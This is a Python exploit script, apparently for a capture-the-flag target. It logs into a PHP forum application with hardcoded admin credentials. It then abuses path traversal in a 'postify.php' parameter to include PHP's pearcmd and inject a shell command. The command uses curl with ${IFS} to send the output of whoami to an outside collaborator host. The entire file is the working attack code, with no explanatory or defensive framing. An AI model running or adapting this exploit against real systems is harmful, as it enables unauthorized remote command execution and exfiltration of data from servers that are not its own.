#! /usr/bin/env python3
import requests, string, re
import urllib3
import socket

urllib3.disable_warnings()

# config
local = True
proxy = True
url = "localhost" if local else "x.x.x.x"
port = 8000 if local else 31447

exfil_server = "<collab>"

sess = requests.Session()
p = {"http": "http://127.0.0.1:8080"} if proxy else {}
sess.proxies.update(p)
# check it's alive
sess.get(f"http://{url}:{port}/files", verify=False)

# login

body = {
    "form_id": "userinfopanel_login",
    "user_name": "admin1234",
    "user_pass": "P@ssw0rd",
    "login": "",
}

sess.post(f"http://{url}:{port}/files/index.php", data=body, verify=False)

# trigger

pearcmd_path = "/usr/local/lib/php/pearcmd"
cmd = f"curl${{IFS}}{exfil_server}/?c=`whoami`"

cookies = "; ".join([f"{k}={v}" for k,v in sess.cookies.items()])

path = f"/files/infusions/forum/postify.php?forum_id=x&thread_id=x&post=../../../../../../../../../..{pearcmd_path}&+run-tests+-ui+$({cmd})+alltests.php"
http_request = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {url}:{port}\r\n"
    f"User-Agent: ggez\r\n"
    f"Cookie: {cookies}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
).encode('latin-1') 

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((url, port))
    s.sendall(http_request)
    response_data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        response_data += chunk
